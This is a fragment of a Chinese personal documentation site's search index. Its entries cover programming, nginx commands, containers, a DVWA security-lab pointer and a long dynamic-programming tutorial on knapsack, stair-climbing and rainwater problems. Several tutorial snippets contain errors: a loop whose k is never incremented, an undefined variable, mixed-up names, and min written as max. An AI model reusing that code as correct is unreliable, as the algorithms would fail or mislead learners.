会创建一个新的任务，并在后台运行，不影响当前任务的执行。 这通常用于启动一个异步任务，而不需要等待它完成 Task: 在当前任务上下文中执行，如果使用 await 等待其完成， 它会被等待执行完成后再继续当前任务的执行","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-asynchronous.html","loc":"/yq-doc-source-docs-rear-end-swift-asynchronous.html"},{"title":"命令行参数选项结构(命令行帮助文档语法格式详解)","text":"方括号 [] 方括号内的值是可选的. 可以一个括号内多个值(以空格分割), 也可以多个值都用括号包裹, 两者是等价的 尖括号 <> 表示括号内的值是必须的, 值需要被具体的值替换 管道 | 多个参数可由管道符隔开, 表示任选其一, 表示互斥 身略号 ... 等, 表示前一个值可重复 大括号 {} 或 圆括号 () 必须, 括号内的值常用管道符分割, 任选其一即可 书写规范 非括号默认参数都是必选 短选项可以堆叠: -a -b -c # 等价与 -abc 短选项的参数可选空格: -a File # 等价与 -aFile 长选项的参数可用空格或者等于符号分割: --input <arg> # 等价与 --input=<arg> 同一个用途选项一般适用逗号隔开: -h, --help 若需指定一个选项带有一个参数，则需 在空格或等号=后放一个描述该参数的词，如下所示。 选项参数遵循尖括号<argument>或全大写ARGUMENT的约定。 如果有必要，可以使用逗号,分隔选项。 其他 用（至少）两个空格来分隔选项和它们的非正式描述【如果只用一个空格，可能会将描述的首个词当做选项的参数】 如果要为带有参数的选项设置默认值，则使用 [default: the-default-value] 的形式将其放到选项描述中 一般常选项参数跟等号, 短选项参数不跟等号: --maxfail=<num> , -m<file> 参考:: 命令行帮助文档语法格式详解","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Command-line-parameter-option-structure.html","loc":"/yq-doc-source-docs-Chaotic-Command-line-parameter-option-structure.html"},{"title":"设计模式","text":"面向对象程序设计 面向对象程序设计（Object-Oriented Programming）是一种范式 基本理念是将数据块与数据相关的行为封装成特殊的、名为对象的实体，同时对象实体的生成工作则是基于程序员给出的一系列\"蓝图\"，这些\"蓝图\"就是类。 类：定义对象结构的\"蓝图\" 对象：类的具体实例 软件设计原则 特征 代码复用 拓展性 设计原则 创建型模式 工厂方法 抽象工厂 生成器 原型 单例 工厂方法说明 在父类提供一个创建对象的方法，允许子类决定实例化对象的类型 结构： 两个类，一个产品类，一个创建者类 产品 声明接口 具体产品 接口的不同实现 创建者 声明返回产品对象的工厂方法 具体创建者 实现 为了实现 高内聚，低耦合 单一职责 开闭原则 注解 简单工厂 ==》 工厂方法 ==》 抽象工厂 简单工厂 简单工厂不算是一个真正的设计模式，而更像是一种我们的编程习惯， 但是在平时编码中这不失为一个简单的方法，可以将客户程序从具体类解耦。 工厂类拥有一个 工厂-方法 , 接受了一个参数，通过不同的参数实例化不同的产品类。 使用一个工厂对象用来生产同一等级结构中的任意产品。（不支持拓展增加产品） 工厂方法 定义了一个创建对象的接口，但由子类决定要实例化的类是哪一个。工厂方法让类的实例化推迟到子类。 使用多个工厂对象用来生产同一等级结构中对应的固定产品。（支持拓展增加产品） 抽象工厂模式 提供一个接口，用于创建相关或依赖对象的家族，而不需要明确指定具体类。 例如，汽车可以分为轿车、SUV、MPV等，也分为奔驰、宝马等。 我们可以将奔驰的所有车看作是一个产品族，而将宝马的所有车看作是另一个产品族。 分别对应两个工厂，一个是奔驰的工厂，另一个是宝马的工厂。 与工厂方法不同，奔驰的工厂不只是生产具体的某一个产品， 而是一族产品（ 奔驰轿车 、奔驰SUV、奔驰MPV）。 \"抽象工厂\"的\"抽象\"指的是就是这个意思。 即相比于工厂方法，抽象工厂定义了一系列的产品，而不是一个产品。 使用多个工厂对象用来生产不同产品族的全部产品。（不支持拓展增加产品；支持增加产品族）","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-desgin-pattern.html","loc":"/yq-doc-source-docs-Chaotic-desgin-pattern.html"},{"title":"关于最后一行空行的问题","text":"主要有两个理由： 某些工具（特别是比较古老的），如果文件的末尾没有 \\n 或 \\r ，就会忽略最后一行。 最后有一个空行，便于判断这个文件传输完整（而不是只传了一半） 现在没有这个问题 大多是一个规范习惯","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-last-line-empty-line-problem.html","loc":"/yq-doc-source-docs-Chaotic-last-line-empty-line-problem.html"},{"title":"一些待看博客","text":"https://yizibi.github.io/ https://www.python.org/downloads/release/python-365/ https://www.cnblogs.com/lgyxta/p/12100623.html https://blog.csdn.net/qq_43739097/article/details/104383456 https://blog.csdn.net/HBT036017/article/details/104930595 https://blog.csdn.net/weixin_31682031/article/details/113135005 https://www.cnblogs.com/linuxk/p/9371475.html 修改mysql密码： https://blog.csdn.net/scorpio_j/article/details/112557655?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.opensearchhbase&spm=1001.2101.3001.4242.1 没啥用 最后重装解决 python队列： https://blog.csdn.net/weixin_43533825/article/details/89155648 python多线程： https://www.runoob.com/python3/python3-multithreading.html https://blog.csdn.net/jiahao1186/article/details/90209397 https://cloud.tencent.com/developer/article/1669101 mysql日志删除： https://www.cnblogs.com/tv151579/p/8289204.html https://www.cnblogs.com/sandea/p/5200054.html python join https://cloud.tencent.com/developer/article/1478401 mysql编码： https://my.oschina.net/zhoyq/blog/3169449 mysql查重 https://blog.csdn.net/haoui123/article/details/80562835 Python子进程执行完但是不结束？ https://www.zhihu.com/question/63265466 winrar下载， 个人免费，商业收费 https://www.rarlab.com/download.htm 设计模式 https://refactoringguru.cn/design-patterns/bridge python3下载mysqlclient https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-some-blog-unwatch.html","loc":"/yq-doc-source-docs-Chaotic-some-blog-unwatch.html"},{"title":"图片格式","text":"简述 JPEG < PNG < SVG JPEG: 有损格式, 不能保存透明区域 PNG: 无损压缩, 较JPEG更大, 支持透明区域 GIF: 动图, 目前兼容性最好 SVG: 设计用, 文件信息以代码形式保存 JPEG JPEG 格式是一种有损的图片压缩格式，它用算法尽量去除冗余的图像和色彩数据，在图片文件较小的情况下可以得到比较高质量的图片。 PNG PNG 图片格式采用的是无损压缩，和 JPEG 相比文件的体积是会大一些的，但是图片质量非常好，而且还支持 Alpha 通道，也就是说 PNG 可以存部分区域透明的图片。 GIF GIF 的特点就是它可以是动图，而且支持图片的透明，但是出于体积的考虑 GIF 只支持 256 色，清晰度和色彩质量并不是很好。 SVG SVG, 可缩放矢量图形(Scalable Vector Graphics)。SVG 格式把图像信息用代码的形式存进了文件中，你可以通过任何一个文本编辑软件（记事本、VS Code等）打开来查看源代码，所以它不但体积小而且扩展性很强，我们可以通过编程的方式控制 SVG 图片进行交互和动画的播放。 怎么选择图片格式 照片用 JPEG，因为色彩比较丰富也不需要透明，用 JPEG 即有较高的图像质量还能保持较小的文件体积。 小图片，小图标，有透明需求的用 PNG，尺寸较大的照片如果用 PNG 文件体积会比 JPEG 大不少。 动图用 GIF，虽然现在有更好的动图技术格式，但是 GIF 是兼容性最好的，基本上所有的设备和平台都支持的很好。 参考:: https://zhuanlan.zhihu.com/p/134173186","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Image-Format.html","loc":"/yq-doc-source-docs-Chaotic-Image-Format.html"},{"title":"COM机制","text":"COM(组件对象模型), 由微软提出, 是关于如何建立组件以及如何通过组件建构应用程序的一个规范. 到2023的现在, 技术可以说是过时了, 思想值得学习. 对组件的需求: 动态链接 隐藏内部实现 参考: COM技术内幕 || 这样理解COM组件","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-COM-mechanism.html","loc":"/yq-doc-source-docs-Chaotic-COM-mechanism.html"},{"title":"通过命令打开系统浏览器","text":"前言 当使用shell, 且当前主机拥有GUI浏览器时, 会有在shell中通过浏览器打开网址的需求 使用 Mac open 'https://www.baidu.com' Linux x-www-browser 'https://www.baidu.com' Windows cmd /c start https://www.baidu.com","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Open-the-browser-through-command.html","loc":"/yq-doc-source-docs-Chaotic-Open-the-browser-through-command.html"},{"title":"AI","text":"这个其实是一个比较广的 计算机视觉 自然语言处理 推荐系统 搜索引擎 等 因为计算机性能发展迅速, 比较火的是 深度学习(神经网络), 说白了就是靠着算力一直算, 以前的时代配置不行, 没那个条件.","tags":"linux","url":"/yq-doc-source-ai.html","loc":"/yq-doc-source-ai.html"},{"title":"杂乱无章","text":"","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-index.html","loc":"/yq-doc-source-docs-Chaotic-index.html"},{"title":"容器、代理与集群","text":"暂时只写了docker与nginx, 集群待补充 什么是虚拟化技术？ 维基百科中的解释是这样的: 虚拟化（技术）是一种资源管理技术，是将计算机的各种实体资源（CPU、内存、磁盘空间、网络适配器等）， 予以抽缴、转换后呈现出来并可供分割、组合为一个或多个电脑配置环境。 对于一台计算机，我们可以简单的划分为三层：从下到上依次是 物理硬件层 操作系统层 应用程序层 容器和虚拟机差异 容器技术的演变: 纯物理机 ----> 物理机上多VMWare虚拟机 ----> 容器 浪费资源 节省, 也有限度 轻量级(有时候只想要一个mysql这种, 可能还想要多个版本共存) 不易拓展迁移 迁移方便 更高效利用系统资源 还是比较重量级 注解 有个误解, Docker不完全代表容器; Docker只是实现了容器技术的一种方式 虚拟机工具: WMVare WorkStation (个人学习使用), 仅支持Windows VMVare esxi (企业版虚拟化); 高性能服务器结合，进行服务器资源虚拟化 KVM, Linux下虚拟工具 虚拟机技术 虚拟机是虚拟出一套硬件，在其上面运行一个完整的操作系统， 例如我们使用KVM，指定系统镜像然后装系统，最终可以使用，在该系统上再运行所需的应用程序。 KVM创建虚拟机时，若指定较少的cpu，内存，硬盘等资源，虚拟机性能较低, 业务支持不好。 容器技术 容器内的应用程序直接运行在宿主机的内核上，容器内没有自己的内核， 也没有对硬件进行虚拟，因此容器比起虚拟机更为轻便。 容器对比KVM的好处 容器能够提供宿主机的性能，而kvm虚拟机是分配宿主机硬件资源， 性能较弱 •同样配置的宿主机，最多可以启动10个虚拟机的话，可以启动100+的容器数量; 启动一个KVM虚拟机，得有一个完整的开机流程，花费时间较长，或许得20S，而启动一个容器只需要 1S; KVM需要硬件CPU的虚拟化支持，而容器不需要; docker更高效的利用系统资源 容器不需要进行硬件虚拟化以及运行一个完整操作系统的额外开销， docker对系统资源的利用率更高，无论是应用执行， 文件存储，还是在内存消耗等方面，都比传统虚拟机更高效。 因此一个同样配置的主机，可以运行处更多数量的容器实例。 集群、分布式、微服务的区别 集群 将同一份项目或者系统, 物理部署到多台机器上分流, 物理上提高可用性 分布式 将项目, 垂直/水平 拆分为多个子模块, 分开部署 水平拆分: 根据\"分层\"的思想进行拆分。 比如前后端分离就是将 前端表示层 单独拆出来 垂直拆分: 根据业务进行拆分。 例如，可以根据业务逻辑，将\"电商项目\"拆分成\"订单项目\"、\"用户项目\"和\"秒杀项目\"。 显然这三个拆分后的项目，仍然可以作为独立的项目使用。像这种拆分的方法，就成为垂直拆分。 微服务 对于分布式的子模块, 进行更细粒度的拆分. 且在当前流程下不存在更细粒度的拆分 例如，以上\"订单项目\"本来就是垂直拆分后的子项目， 但实际上\"订单项目\"还能进一步拆分为\"购物项目\"、\"结算项目\"和\"售后项目\" Nginx常用命令 一览: # 快速关闭Nginx，可能不保存相关信息，并迅速终止web服务 nginx -s stop # 平稳关闭Nginx，保存相关信息，有安排的结束web服务 nginx -s quit # 因改变了Nginx相关配置，需要重新加载配置而重载 nginx -s reload # 重新打开日志文件 nginx -s reopen # 为 Nginx 指定一个配置文件，来代替缺省的 nginx -c filename # 不运行，而仅仅测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件 nginx -t # 显示 nginx 的版本 nginx -v # 显示 nginx 的版本，编译器版本和配置参数 nginx -V # 格式换显示 nginx 配置参数 2>&1 nginx -V | xargs -n1 2>&1 nginx -V | xargs -n1 | grep lua","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-index.html"},{"title":"安全","text":"大致路线 渗透 单纯的攻击 渗透测试 模拟渗透(有授权与限制, 保密等) 还有 EDU SRC (教育渗透) 相关工具 DVWA https://github.com/digininja/DVWA 通过简单明了的界面来练习一些最常见的 Web 漏洞，所练习的漏洞具有不同的难度级别。 请注意，此软件存在提示和无提示的漏洞。 这是特意为止。 我们鼓励您依靠自己的能力尝试并发现尽可能多的安全问题。 clone地址: https://github.com/digininja/DVWA.git 默认用户密码: admin password 安装见 /docs/安全/学习记录/DVWA靶场搭建","tags":"安全","url":"/yq-doc-source-docs-Safety-index.html","loc":"/yq-doc-source-docs-Safety-index.html"},{"title":"数据结构","text":"算法-动态规划 主要是要想到一个状态转移方程, 根据这个方程来写代码, 以 算法示例-01背包问题 为例 注解 也叫填表法, 记忆化搜索 算法-贪心 以 01 背包为例, 先按照贪心的方向排序, 比如考虑三种排序策略 重量最轻 价值最高 性价比最高(价值/重量最高) 然后按照这个顺序从最好的开始, 但是会导致一个问题, 结果不一定是最优解. 可参见: /docs/数据结构/贪心算法/index 滚动数组 主要将目标集中在当前计算需要的数据上, 丢弃不必要的数据 滚动数组-斐波那契数列 先以 斐波那契数列 为例, 第一和第二个数为1, 后续每一个数前两个数之和: 1、1、2、3、5、8、13、21、34 基础的解法 d = [1, 1] for i in range(2, n): d[i] = d[i-1] + d[i-2] 这个时候的空间复杂度为数组d, O(n) 两个变量解法 仔细观察, 计算每一步实际上只需要前两次的值就行, 那么实际上可以只需要两个变量即可: a, b = [1, 1] i = 2 while i < n: a = a+b b = a+b i += 2 # 最后需要判断一个奇偶决定返回a还是b return b if n % 2 == 0 else a 这个时候空间复杂度就变成了O(2), 就是O(1) 大小为3数组解法 或者利用一个大小为3的数组: d = [0, 1, 1] for i in range(2, n): d[0], d[1] = d[1], d[2] d[2] = d[0] + d[1] return d[2] 算法示例-01背包问题 有一个物品重量数据 width 和 其中每一个物品对应的价值数组 value, 比如 width[i] 的价值是 value[i], 求当背包容量为 big-package 时, 能装下物品的最大价值 首先找到状态转移方程, 定义: i, 物品下标i, 表示这个物品 j, 当前背包容量 d[i][j], 表示当选择第i个物品时候, 且容量为j时候的最大价值 当遍历到第i个物品时候, 有两种情况: 选择第i个物品, 那么 d[i][j] = d[i-1][j-width[i]] + value[i] 不选择第i个物品, 那么 d[i][j] = d[i-1][j] 选择这两个情况中价值最大的那个: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]] + value[i]) 要注意边界条件和容量值, 比如容量值要大于0才可以选择当前物品: j-width[i] > 0 边界条件, 当容量j为0的时候, 对于任意i: d[i][0] = 0 如果没有物品, 虽然也可以定义: d[0][j] = 0 但是仔细考虑是没有必要的, 一方面是在i的维度会多一层值, 另一方面可以直接从第一个物品(下标0)来作为边界值, 就不用考虑下标减1的情况: d[0][j] = value[0] if j >= width[0] else 0 # 或者三目, 伪代码懂意思就行 d[0][j] = j >= width[0] ? value[0] : 0 当然用没有物品作为边界值也可以, 不过要注意, 这样后面使用下标注意减1, 因为0表示没有物品, 1表示第一个物品, 对应索引为0(也就是要记得减一) 伪代码解(使用第一个物品作为边界): n = len(width) # n 行, 背包数 + 1 列, 初始值为 0 d = [[0] * (big_package_size+1) for _ in range(n)] # 当选择第一个物品时, 边界值 for j in range(big_package_size+1): d[0][j] = value[0] if j >= width[0] else 0 # 构造动态转移方程 for i in range(n): for j in range(big_package_size+1): if j-width[i] >= 0: d[i][j] = max( d[i-1][j], d[i-1][j-width[i]] + value[i] ) else: d[i][j] = d[i-1][j] # 为什么直接是最后一个值, 因为都是从上一个值推导出来的 max ... return d[n-1][big_package_size] 图解, 以物品重量 w=[1,3,4], 价值 v=[15,20,30], 背包最大容量4为例: 列,容量j 0 1 2 3 4 行,物品i 0 0 15 15 15 15 1 0 15 15 20 35 2 0 15 15 20 35 注解 不需要先排序, 因为看物品i, 是一个个子问题, 与排序是否无关 两个for循环嵌套顺序不影响结果, 因为 如果外层用物品, d[i][j] 是根据 d[i-1][j] 与 d[i-1][j-width[i]] 确定的(需要用的物品下标i小于等于当前层面, 之前层的所有j都是有值的), 如果外层用容量, d[i][j] 也是根据 d[i-1][j] 与 d[i-1][j-width[i]] 确定的(需要用的容量j小于等于当前层, 之前层的所有i都是有值的), 都在上一层 提示: d[i-1][j - width[i]] 是物品 width[0:i] (下标0到i-1) 的最优解 直接在编辑器手写的, 没运行过, 懂意思就行 优化空间-滚动数据 滚动数组是什么可看上面 滚动数组 分析, 当遍历物品i时候, 需要用的数据只有物品i-1的, 即只会使用上一层, 区别就是根据不同的情况, 选择上一层的不同容量的数据, 那么根据滚动数组的概念, 辅助数组只要两层即可(当前层与上一层), 这个时候内循环不管从大到小 还是从小到大遍历皆可. 再仔细想我们的规划方程: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]] + value[i]) 可以转换为一维: d[j] = max(d[j], d[j-w[i]] + v[i]) 现在讲讲内循环为什么应该从大到小. 先看外循环, 每次计算物品i时, 用到的物品下标只与i-1有关, 再看内循环的j, 用到的值有: j j-width[i] 两种策略, 还是以上面的物品重量 w=[1,3,4], 价值 v=[15,20,30], 背包最大容量4为例: 列,容量j 0 1 2 3 4 行,物品i 0 0 15 15 15 15 1 0 15 15 20 35 2 0 15 15 20 35 我们尝试将其转换为一维数组, 当行物品i==1时: d[1][0] = 0 d[1][1] = max(d[0][1], d[0][1-3] + 20) = max(15) = 15 d[1][2] = max(d[0][2], d[0][2-3] + 20) = max(15) = 15 d[1][3] = max(d[0][3], d[0][3-3] + 20) = max(15, 20) = 20 d[1][4] = max(d[0][4], d[0][4-3] + 20) = max(15, 15+20) = 35 再次可以总结出, 计算i层时候, 只与上一层i-1有关(这里例子是1-1=0), 那列j与什么有关呢, 观察目前的i==1变化趋势: 1-3 2-3 3-3 4-3 其实归根结底就是: j - w[i] 且j不断增大到最大容量, 然后就更新当前容量时候的值, 那么可以说 当前更新的 容量列(j) 与 上一层的: j - w[i] 有关, 且: j - w[i] 总是小于等于j的. 所以如果要用一维数据d[j], 当内循环从小到大遍历的时候: d[j] = max(d[j], d[j-w[i]] + v[i]) 先记录一下当前的d数组d[0]: d = [0, 15, 15, 15, 15] 归纳一下当i==1的时候更新的内容: d[0] = 0 d[1] = max(d[1], d[1-3] + 20) = max(15) = 15 d[2] = max(d[2], d[2-3] + 20) = max(15) = 15 d[3] = max(d[3], d[3-3] + 20) = max(15, d[0] + 20) = 20 d[4] = max(d[4], d[4-3] + 20) = max(15, d[1] + 20) = 20 观察一下从小到大遍历有没有什么问题? 当i==1, 计算d[3] 的时候, 用到了d[0], 但是d[0] 其实已经被更新了, 是新的: d[0] = 0 同理当i==1, 计算d[4] 的时候, 用到了d[1], 但是d[1] 其实已经被更新了, 是新的: d[1] = 15 那么怎么解决这个问题呢? 答案就是 从大到小遍历 , 因为当更新 d[j] 是, 需要用到的 j-w[i] 往往是小于 当前j的, 所以我们只要先更新最大的, 这个时候 j-w[i] 还没被更新, 还是上次的. 简而言之, 计算 d[i][j] 时, 依赖 d[i-1][j-width[i]] , 需要保证上一层的数据使用的时候还是原来的, 即 确保 ``d[i-1][j-width[i]]`` 存储的是上一行的值，即确保 ``d[j-width[i]]`` 还没有被更新，所以遍历方向是从大到小。 编码: for i in range(n): # 遍历物品 for j in range(big_package_size, -1, -1): # 遍历背包容量 if j >= weight[i]: d[j] = max(d[j], d[j - weight[i]] + value[i]) else: # 说明前面的都不满足 j - weight[i] >= 0 , 值就是当前值, 直接跳出此处循环 break 算法示例-完全背包 有一个物品重量数据 width 和 其中每一个物品对应的价值数组 value, .. 以及每一个物品的花费数组 cost(就是你要拿这个物品要用多少钱买), 且 每一个物品i是无限的 , 比如 width[i] 的单价值是 value[i], .. 购买单件需要花费 cost[i] 求当背包容量为 big-package 时, 能装下物品的最大价值 与 算法示例-01背包问题 相比, 完全背包物品有无限个 与其相似, 得出规律: 选择 0 件物品i 的最大价值，即: d[i-1][j] 选择 1 件物品i 的最大价值，即: d[i-1][j-width[i]] + value[i] 选择 2 件物品i 的最大价值，即: d[i-1][j-width[i]*2] + value[i]*2 ... 记得考虑条件, 不能超过背包容量: j-width[i] * k >= 0 还是先遍历物品 方程: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]*k] + value[i]*k) # =》 当k为0 d[i-1][j-width[i]*k] + value[i]*k = d[i-1][j] # 所以可以直接写成 d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) 当考虑k时编码: for i in range(n): for j in range(big_package_size+1): # 初始 d[i][j] = d[i-1][j] # 即k==0 k = 1 # while j-width[i]*k >= 0: while j >= width[i]*k: d[i][j] = max( d[i][j], d[i-1][j-width[i]*k] + value[i]*k ) 可以看出时间复杂度是比较高的, 这个时候是否可以将k的因素给去掉呢? 可以. 先看原始的方程: d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) 将k展开: d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) = max(d[i-1][j-width[i]*0] + value[i]*0, d[i-1][j-width[i]*1] + value[i]*1, d[i-1][j-width[i]*2] + value[i]*2 ... d[i-1][j-width[i]*k] + value[i]*k ) 可以简单的得到当容量统一减小width[i]时: d[i][j-width[i]] = max(d[i-1][j-width[i]*1] + value[i]*0, d[i-1][j-width[i]*2] + value[i]*1, d[i-1][j-width[i]*3] + value[i]*2 ... d[i-1][j-width[i]*(k+1)] + value[i]*k ) 对于max来说, 在其上加减一个数是不影响结果的, 所以对上一个式子统一加上value[i]: d[i][j-width[i]] + value[i] = max(d[i-1][j-width[i]*1] + value[i]*1, d[i-1][j-width[i]*2] + value[i]*2, d[i-1][j-width[i]*3] + value[i]*3 ... d[i-1][j-width[i]*(k+1)] + value[i]*(k+1) ) 就得到了: d[i][j] = max(d[i-1][j-width[i]*k] + value[i]*k) # 0 <= k < max_k # 将0分离出来 d[i][j] = max(d[i-1][j], d[i-1][j-width[i]*k] + value[i]*k) # 1 <= k < max_k # 带入上面对max的操作 d[i][j-width[i]] + value[i] d[i][j] = max(d[i-1][j], d[i][j-width[i]] + value[i]) # 1 <= k < max_k 可以简单的理解为, 当计算物品i时, 从相邻的物品(可能是自己)算起, 此时消掉k编码: for i in range(n): for j in range(big_package_size+1): if j >= width[i]: d[i][j] = max( d[i-1][j], d[i][j-width[i]] + value[i] ) else: d[i][j] = d[i-1][j] 使用 滚动数组 , 转换为一维数组 方程: d[j] = max(d[j], d[j-width[i]] + value[i]) 注意此时与01背包不同, 01背包使用的是上一层的, 所以内循环是从大到小遍历, 但是此时是完全背包, 使用的是当前层的数据, 需要先更新, 所以完全背包内循环是从小到大遍历: for i in range(n): for j in range(big_package_size+1): if j >= width[i]*k: d[j] = max( d[j], d[j-width[i]] + value[i] ) 此处内循环是从小到大遍历, 简而言之, 计算 d[i][j] 时, 依赖 d[i][j-width[i]] , 需要保证数据使用的时候还是当前层已经更新的. 即 确保 ``d[i][j-width[i]]`` 存储的是当前行的值，确保 ``d[j-width[i]]`` 已经更新，所以遍历方向是从小到大。 参考: 【动态规划/背包问题】从数学角度推导「完全背包」与「01 背包」之间的遍历顺序关系 背包问题总结( 1 ) 01 背包，完全背包，多重背包，分组背包 算法示例-爬楼梯 有一个台阶 1~n, 每次可以走 1~n 步(n不大于剩余楼梯数), 有多少种走法 解: 考虑在第n阶的时候, 用 d[n] 表示一共有多少选择, 有这些选择 从 n-1 开始, 走 1 步, 那么只需要考虑 d[n-1] 有多少种 (走一步的本身与前面的每一个 d[n-1] 构成一种选择, 所以没有额外需要加的) 注解 对很多人来说, 最卡的一点就是, 没想通: d[n-1] 中的每一种方案, 都与最后的一步, 一起继续构成这一种方案 , 下同 从 n-2 开始, 走 2 步, d[n-2] 从 n-3 开始, 走 3 步, d[n-3] 省略... 从 1 开始, 走 n-1 步, d[1], 显而易见 d[1] = 1 可以推断出: d[n] = d[n-1] + d[n-2] + d[n-3] + ... + d[1] 编码: d = [0] * (n+1) d[1] = 1 for i in range(2, n+1): for j in range(1, i): # j 范围是, [1, i-1], 因为 j 为 i 的时候加的是 d[0], 值为0, 可以简化掉 d[i] += d[i-j] # 内循环也可以从头部加起来 # for j in range(1, i): # d[i] += d[j] return d[n] 优化, 由上面的递推公式可以推断出: d[n-1] = d[n-2] + d[n-3] + ... + d[1] 所以, 原来的递推可以变化为: d[n] = d[n-1] + d[n-2] + d[n-3] + ... + d[1] = d[n-1] + (d[n-2] + d[n-3] + ... + d[1]) = d[n-1] + d[n-1] = 2 * d[n-1] 即: d[n] = 2 * d[n-1] 也就说说, 第n个结果是上一个结果的 2 倍, 那就好办了, 一共有 n 个台阶, 一共需要被累乘(n-1)次, 直接: return 2 ** (n-1) 也可以笨一点递归乘: d = [0] * (n+1) d[1] = 1 for i in range(2, n+1): d[i] = 2 * d[i-1] return d[n] 其他-接雨水 具体案例需要距离分析, 比如接雨水问题, 参考: 经典面试题：接雨水问题详解 就是用一个数组表示一个条形图，问你这个条形图最多能接多少水: int trap(int[] height); 最重要的几点: 对于每一个位置i, 能接到的雨水数: min(l_max, r_max) - height[i] 每一个位置i, 左右的最高值都可以先算出, 这是备忘录的基础 暴力: int trap(vector<int>& height) { int n = height.size(); int ans = 0; for (int i = 1; i < n - 1; i++) { int l_max = 0, r_max = 0; // 找右边最高的柱子 for (int j = i; j < n; j++) r_max = max(r_max, height[j]); // 找左边最高的柱子 for (int j = i; j >= 0; j--) l_max = max(l_max, height[j]); // 如果自己就是最高的话， // l_max == r_max == height[i] ans += min(l_max, r_max) - height[i]; } return ans; } 备忘录解法: int trap(vector<int>& height) { if (height.empty()) return 0; int n = height.size(); int ans = 0; // 数组充当备忘录 vector<int> l_max(n), r_max(n); // 初始化 base case l_max[0] = height[0]; r_max[n - 1] = height[n - 1]; // 从左向右计算 l_max for (int i = 1; i < n; i++) l_max[i] = max(height[i], l_max[i - 1]); // 从右向左计算 r_max for (int i = n - 2; i >= 0; i--) r_max[i] = max(height[i], r_max[i + 1]); // 计算答案 for (int i = 1; i < n - 1; i++) ans += min(l_max[i], r_max[i]) - height[i]; return ans; } 双指针解法: int trap(vector<int>& height) { if (height.empty()) return 0; int n = height.size(); int left = 0, right = n - 1; int ans = 0; int l_max = height[0]; int r_max = height[n - 1]; while (left <= right) { l_max = max(l_max, height[left]); r_max = max(r_max, height[right]); // ans += min(l_max, r_max) - height[i] if (l_max < r_max) { ans += l_max - height[left]; left++; } else { ans += r_max - height[right]; right--; } } return ans; } 仔细发现, 双指针相对于备忘录其实有点不同, 备忘录计算的是每次紧邻位置i左右的最高点, 即 l_max[i] 和 r_max[i] 代表的是 height[0..i] 和 height[i..end] 的最高柱子高度; 双指针仅仅是当前指针位置一侧最高点, 即 l_max 和 r_max 代表的是 height[0..left] 和 height[right..end] 的最高柱子高度. 那后者为什么可以代表前者? 还是看计算公式: min(l_max, r_max) - height[i] 我们需要的只是 l_max, r_max 中的最小值, 先看备忘录, 与正常的思维一致: min(l_max, r_max) = max(max(height[0..i]), max(height[i..end])) 再看双指针: min(l_max, r_max) = max(max(height[0..left]), max(height[right..end])) 区别就是少考虑了 height[left..right], 那么这个区间会造成影响吗? 解析说明 先考虑: max(height[0..left]) < max(height[right..end]) # 即 l_max < r_max 的情况, 如果 height[left..right] 区间的值都比 max(height[right..end]) (即r_max) 小了, 那么实际两者就是等价的: max(max(height[0..left]), max(height[right..end])) = max(max(height[0..i]), max(height[i..end])) 如果height[left..right] 区间的值存在比 max(height[right..end]) (即r_max) 大的, 即使找到那个值(记为 r_plus )了, 就是: max(l_max, r_max) => max(l_max, r_plus) # 上面说了这是 l_max < r_max 的情况, 所以 两者的结果都是一样的 因为 l_max < r_max, 对于比 r_max 更大的 r_plus, l_max < r_plus 肯定也是成立的 两者也是等价的 反之当 l_max > r_max 同样也成立, 所以完全可以用双指针.","tags":"数据结构","url":"/yq-doc-source-docs-data-structure-index.html","loc":"/yq-doc-source-docs-data-structure-index.html"},{"title":"数据库","text":"","tags":"数据库","url":"/yq-doc-source-docs-database-index.html","loc":"/yq-doc-source-docs-database-index.html"},{"title":"文档相关","text":"","tags":"文档","url":"/yq-doc-source-docs-document-index.html","loc":"/yq-doc-source-docs-document-index.html"},{"title":"前端","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-index.html","loc":"/yq-doc-source-docs-front-end-index.html"},{"title":"操作系统","text":"按照常见类型划分, 如linux, windows等","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-index.html","loc":"/yq-doc-source-docs-operating-system-index.html"},{"title":"后端","text":"编程语言","tags":"后端","url":"/yq-doc-source-docs-rear-end-index.html","loc":"/yq-doc-source-docs-rear-end-index.html"},{"title":"版本控制","text":"","tags":"版本控制","url":"/yq-doc-source-docs-version-control.html","loc":"/yq-doc-source-docs-version-control.html"},{"title":"天涯神贴","text":"kkndme_tianya（持续更新中...） 天涯神贴 「2010年的房地产调控，我们收获了什么？写在房价暴涨前」 脱水版，内容时间顺序和原贴一致，原贴中的优质非楼主写的内容，添加了引用格式便于区分。 除标题外，所有内容均来自原贴，标题是我简单加的，目的是为了做目录，便于查看。 调控降房价是刚需的一厢情愿 1、人人都有居住权。房子是用来住的，不是用来炒的。 2、房子太贵了，租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘。 3、房价上涨造成物价上涨，人民生活变得困难 调控的真正目的：防范金融风险 & 通过垄断实现gj利益最大化 官方公布的统计数据，只要关系到某个群体的利益，就一定会被修饰导致失真 税收从来都是向下游转嫁的 & 房产税迟迟不出台的真正原因 房地产的现状 房价持续上涨的本质是稀缺性让好房子成为资金最好的去处 关于垄断 1、垄断的好处是没有风险 2、垄断可以解决社会稳定 3、房屋垄断只会愈演愈烈，底层人民想要拥有一套房子的难度只会越来越难 民生问题 房产税的制定原则 维稳的本质是人民能吃饱饭 